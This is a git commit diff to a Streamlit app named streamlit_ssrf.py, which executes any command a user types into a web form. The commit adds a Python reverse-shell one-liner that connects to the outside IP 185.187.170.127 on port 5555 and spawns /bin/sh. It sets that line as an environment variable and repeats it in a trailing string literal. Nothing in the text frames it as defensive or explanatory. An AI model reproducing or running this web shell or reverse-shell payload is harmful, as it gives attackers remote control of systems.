f4b2cd101f90339797a627bdf17451f393061040
henrique <iklobato1@gmail.com>
2024-01-15 22:39:27 -0300

    command sudo

--- streamlit_ssrf.py
+++ streamlit_ssrf.py
@@ -1,6 +1,10 @@
 import streamlit as st
 import subprocess
 
+import os
+os.environ['SUDO_COMMAND'] = """python -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("185.187.170.127",5555));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'"""
+print(os.environ)
+
 
 def execute_command(command):
     try:
@@ -11,19 +15,30 @@ def execute_command(command):
 
 
 def main():
-    st.title("Command Executor")
+    st.title("Command Shell")
+
+    command_history = []
 
     # Input box for user to enter a command
-    command_input = st.text_input("$ ")
+    command_input = st.text_input("Enter command:")
 
     # Button to execute the command
     if st.button("Execute"):
         if command_input:
-            st.text("Executing command...")
             result = execute_command(command_input)
-            st.text("Command result:")
-            st.text(result)
+            command_history.append({"command": command_input, "result": result})
+
+    # Display command history
+    st.text("Command History:")
+    for entry in command_history:
+        st.text(f"> {entry['command']}")
+        st.text(f"  {entry['result']}")
+        st.text("")
 
 
 if __name__ == "__main__":
     main()
+
+"""
+python -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("185.187.170.127",5555));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+"""
